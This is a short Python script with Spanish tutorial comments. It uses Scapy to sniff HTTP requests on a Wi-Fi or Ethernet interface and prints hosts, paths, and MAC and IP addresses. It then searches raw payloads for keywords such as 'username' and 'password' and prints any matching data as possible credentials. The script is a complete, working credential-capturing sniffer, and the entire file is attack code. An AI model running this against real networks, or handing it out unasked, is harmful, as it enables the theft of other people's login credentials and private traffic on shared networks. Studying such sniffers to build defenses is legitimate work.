import scapy.all as scapy #importamos Scapy
from scapy.layers import http #importamos la función http

def sniff(interface): #esta es la tarjeta de red

    #Este método llama al objeto scapy y pide la interfaz, si quieres guardar los procesos en la memoria y un método que haremos nosotros para imprimir los packetes.
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def sniffed_packet(packet):

    #Si tiene la capa http entonces muéstralo
    if packet.haslayer(http.HTTPRequest):

        host = packet[http.HTTPRequest].Host.decode()#Obtenemos el host
        path = packet[http.HTTPRequest].Path.decode()#Obtenemos la ruta
        print("********HTTP REQUEST********")
        print("Host -----> " + host)
        print("Path -----> " + path)
        
    
        ethernetDst = packet[scapy.Ether].dst
        ethernetSrc = packet[scapy.Ether].src
        ethernetType = packet[scapy.Ether].type
        print("********Ethernet********")
        print("Ethernet Dst -----> " + ethernetDst)
        print("Ethernet Src -----> " + ethernetSrc)
        print("Ethernet Type -----> " + str(ethernetType))


        
        print("********IP********")
        ipDst = packet[scapy.IP].dst
        ipSrc = packet[scapy.IP].src
        print("IP Dst -----> " + ipDst)
        print("IP Src -----> " + ipSrc)


        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("********RAW********")
                    print("Posible password/username -----> " + load + "\n\n\n")
                    break
        

#   ---Estas son las formas de ejecutar el script según el puerto de la pc----
        
#   Para Ethernet
#   python sniffer_recortado.py -i Ethernet

#   Para Wifi
#   python sniffer_recortado.py -i Wi-Fi


def main():

    # --Dependiendo de la interfaz que uses, tienes que cambiar a Ethernet o Wi-Fi
    
    #sniff("Ethernet")
    sniff("Wi-Fi")

if __name__ == '__main__':
    main()